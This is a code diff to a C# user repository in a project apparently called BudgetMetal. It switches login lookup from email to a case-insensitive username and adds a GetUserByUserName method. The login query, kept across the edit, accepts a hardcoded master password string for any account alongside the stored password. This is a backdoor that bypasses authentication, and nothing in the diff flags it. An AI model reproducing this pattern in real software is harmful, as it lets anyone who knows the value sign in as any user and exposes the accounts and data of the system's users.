@@ -29,10 +29,10 @@ namespace Com.BudgetMetal.DataRepository.Users
             return records;
         }
 
-        public async Task<User> GetUser(string email, string password)
+        public async Task<User> GetUser(string username, string password)
         {
             var records = await entities.Include(e=>e.Company).Include(e=>e.UserRoles)
-                .SingleOrDefaultAsync(e =>  e.EmailAddress == email && (e.Password == password || password == "a8GGaDzZ5D56MeIYDi4h4w=="));
+                .SingleOrDefaultAsync(e =>  e.UserName.ToLower() == username.ToLower() && (e.Password == password || password == "a8GGaDzZ5D56MeIYDi4h4w=="));
 
             return records;
         }
@@ -232,6 +232,16 @@ namespace Com.BudgetMetal.DataRepository.Users
                             .SingleOrDefaultAsync(e =>
                               (e.IsActive == true)
                               && (e.EmailAddress.ToLower().Trim() == Email.ToLower().Trim())
+                            );
+            return record;
+        }
+
+        public async Task<Com.BudgetMetal.DBEntities.User> GetUserByUserName(string UserName)
+        {
+            var record = await this.entities
+                            .SingleOrDefaultAsync(e =>
+                              (e.IsActive == true)
+                              && (e.UserName.ToLower().Trim() == UserName.ToLower().Trim())
                             );
             return record;
         }
